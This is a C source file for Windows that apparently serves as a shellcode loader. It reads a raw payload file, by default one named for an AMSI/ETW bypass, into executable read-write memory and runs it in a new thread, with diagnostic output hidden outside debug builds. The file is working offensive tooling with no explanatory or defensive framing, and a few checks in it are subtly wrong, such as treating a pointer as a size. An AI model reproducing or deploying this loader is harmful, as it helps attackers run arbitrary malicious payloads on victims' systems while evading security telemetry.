#include <windows.h>

#ifdef DEBUG
#include <stdio.h>
#endif

PVOID LoadFile(PSTR filePath, SIZE_T* fileSize) {
    PVOID    imgBuf      = NULL;
    HANDLE   hFile       = NULL;
    HANDLE   hHeap       = NULL;
    DWORD    dwBytesRead = 0;
    BOOL     bResult     = FALSE;

    hFile = CreateFileA(
            filePath,
            GENERIC_READ,
            0,
            NULL,
            OPEN_ALWAYS,
            0,
            NULL);

    if (!hFile) {
#ifdef DEBUG
        printf("[!] CreateFileA failed with error: [%lu]\n", GetLastError());
#endif
        return NULL;
    }

    *fileSize = GetFileSize(hFile, NULL);
    if (fileSize <= 0) {
#ifdef DEBUG
        printf("[!] GetFileSize failed with error: [%lu]\n", GetLastError());
#endif
        return NULL;
    }

    hHeap = GetProcessHeap();
    if (!hHeap) {
#ifdef DEBUG
        printf("[!] GetProcessHeap failed with error: [%lu]\n", GetLastError());
#endif
        return NULL;
    }

    imgBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, *fileSize);
    if (!imgBuf) {
#ifdef DEBUG
        printf("[!] HeapAlloc failed with error: [%lu]\n", GetLastError());
#endif
        return NULL;
    }

    bResult = ReadFile(hFile, imgBuf, *fileSize, &dwBytesRead, NULL);
    if (!bResult) {
#ifdef DEBUG
        printf("[!] ReadFile failed with error: [%lu]\n", GetLastError());
#endif
        return NULL;
    }

    return imgBuf;
}

PVOID AllocateMemory(SIZE_T memSize) {
    if (memSize <= 0) {
#ifdef DEBUG
        printf("[!] Invalid memory allocation size\n");
#endif
        return NULL;
    }

    PVOID pAddr = VirtualAlloc(NULL, memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAddr) {
#ifdef DEBUG
        printf("[!] VirtualAlloc failed with error: [%lu]\n", GetLastError());
#endif
        return NULL;
    }

    return pAddr;
}

typedef void(*PayloadMain)();

int main(int argc, char** argv) {
    PVOID  pPayloadFile = NULL;
    PVOID  pPayload     = NULL;
    SIZE_T sPayload     = 0;
    HANDLE hThread      = NULL;

    // Check for args
    if (argc < 2) {
#ifdef DEBUG
        printf("[!] Usage: %s <payload.bin>\n", argv[0]);
#endif
        argv[1] = "..\\..\\..\\..\\amsi-etw-ec.bin";
    }

    pPayloadFile = LoadFile(argv[1], &sPayload);
    if (!pPayloadFile) {
#ifdef DEBUG
        printf("[!] Failed to read payload\n");
#endif
        return -1;
    }

    pPayload = AllocateMemory(sPayload);
    if (!pPayload) {
#ifdef DEBUG
        printf("[!] Failed to allocate memory\n");
#endif
        return -1;
    }

    RtlCopyMemory(pPayload, pPayloadFile, sPayload);
#ifdef DEBUG
    printf("[i] %llu bytes of payload injected at 0x%llx\n", sPayload, (uintptr_t)pPayload);
    printf("[i] Execute payload?\n");
    system("pause");
#endif

    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pPayload, NULL, 0, NULL);
    if (!hThread) {
#ifdef DEBUG
        printf("[!] CreateThread failed with error: [%lu]\n", GetLastError());
#endif
        return -1;
    }

    WaitForSingleObject(hThread, -1);

    return 0;
}

